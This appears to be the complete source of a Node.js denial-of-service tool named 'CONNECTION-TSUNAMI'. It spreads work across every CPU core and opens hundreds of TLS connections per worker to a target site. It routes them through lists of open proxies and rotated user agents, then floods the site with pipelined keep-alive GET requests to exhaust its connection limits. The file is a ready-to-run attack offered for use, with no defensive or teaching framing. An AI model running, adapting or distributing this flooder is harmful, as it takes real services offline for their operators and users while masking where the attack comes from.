// R10-4: CONNECTION-TSUNAMI - Keep-Alive Connection Flood
// Focus: Saturate connection limits
// Technique: Long-lived connections + Pipelining

const http = require('http');
const https = require('https');
const tls = require('tls');
const net = require('net');
const fs = require('fs');
const cluster = require('cluster');
const os = require('os');

const CPU_CORES = os.cpus().length;
let proxies = [];
let userAgents = [];

// Load proxies and user agents
try {
    proxies = fs.readFileSync('proxy.txt', 'utf-8').split('\n')
        .map(line => line.trim())
        .filter(line => line && !line.startsWith('#') && line.includes(':'));
    console.log(`[R10-4] Loaded ${proxies.length} proxies`);
} catch (e) {
    console.log('[R10-4] No proxy.txt found, running without proxies');
}

try {
    userAgents = fs.readFileSync('ua.txt', 'utf-8').split('\n')
        .map(line => line.trim())
        .filter(line => line && !line.startsWith('#'));
} catch (e) {}

class ConnectionPool {
    constructor(target, size) {
        this.pool = [];
        this.target = target;
        this.size = size;
        this.init();
    }
    
    init() {
        for (let i = 0; i < this.size; i++) {
            this.addConnection();
        }
    }
    
    addConnection() {
        if (proxies.length === 0) {
            // Direct connection
            const tlsSocket = tls.connect(443, this.target.hostname, {
                servername: this.target.hostname,
                rejectUnauthorized: false
            }, () => {
                this.pool.push(tlsSocket);
            });
            
            tlsSocket.on('error', () => {
                const idx = this.pool.indexOf(tlsSocket);
                if (idx > -1) this.pool.splice(idx, 1);
                setTimeout(() => this.addConnection(), 1000);
            });
            
            return;
        }
        
        // Proxy connection
        const proxy = proxies[Math.floor(Math.random() * proxies.length)];
        const [proxyHost, proxyPort] = proxy.split(':');
        
        const netSocket = net.connect(parseInt(proxyPort), proxyHost, () => {
            netSocket.write(`CONNECT ${this.target.hostname}:443 HTTP/1.1\r\nHost: ${this.target.hostname}:443\r\n\r\n`);
            
            netSocket.once('data', () => {
                const tlsSocket = tls.connect({
                    socket: netSocket,
                    servername: this.target.hostname,
                    rejectUnauthorized: false
                }, () => {
                    this.pool.push(tlsSocket);
                });
                
                tlsSocket.on('error', () => {
                    const idx = this.pool.indexOf(tlsSocket);
                    if (idx > -1) this.pool.splice(idx, 1);
                    setTimeout(() => this.addConnection(), 1000);
                });
            });
        });
        
        netSocket.on('error', () => {
            setTimeout(() => this.addConnection(), 1000);
        });
    }
    
    sendRequest() {
        if (this.pool.length === 0) return;
        
        const socket = this.pool[Math.floor(Math.random() * this.pool.length)];
        const ua = userAgents.length > 0 
            ? userAgents[Math.floor(Math.random() * userAgents.length)]
            : 'Mozilla/5.0';
        
        const request = `GET ${this.target.pathname}?${Math.random()} HTTP/1.1\r\nHost: ${this.target.hostname}\r\nUser-Agent: ${ua}\r\nConnection: keep-alive\r\n\r\n`;
        
        socket.write(request);
    }
}

if (cluster.isMaster) {
    console.log(`[R10-4] CONNECTION-TSUNAMI launching on ${CPU_CORES} cores`);
    for (let i = 0; i < CPU_CORES; i++) cluster.fork();
    
    setTimeout(() => process.exit(0), process.argv[3] * 1000 || 300);
} else {
    const target = new URL(process.argv[2]);
    const time = process.argv[3] || 300;
    
    const pool = new ConnectionPool(target, 500);
    let requestCount = 0;
    
    setTimeout(() => {
        const interval = setInterval(() => {
            for (let i = 0; i < 500; i++) {
                pool.sendRequest();
                requestCount++;
            }
        }, 100);
        
        setInterval(() => {
            console.log(`[R10-4] RPS: ${requestCount} | Pool: ${pool.pool.length}`);
            requestCount = 0;
        }, 1000);
        
        setTimeout(() => {
            clearInterval(interval);
            process.exit(0);
        }, time * 1000);
    }, 5000);
}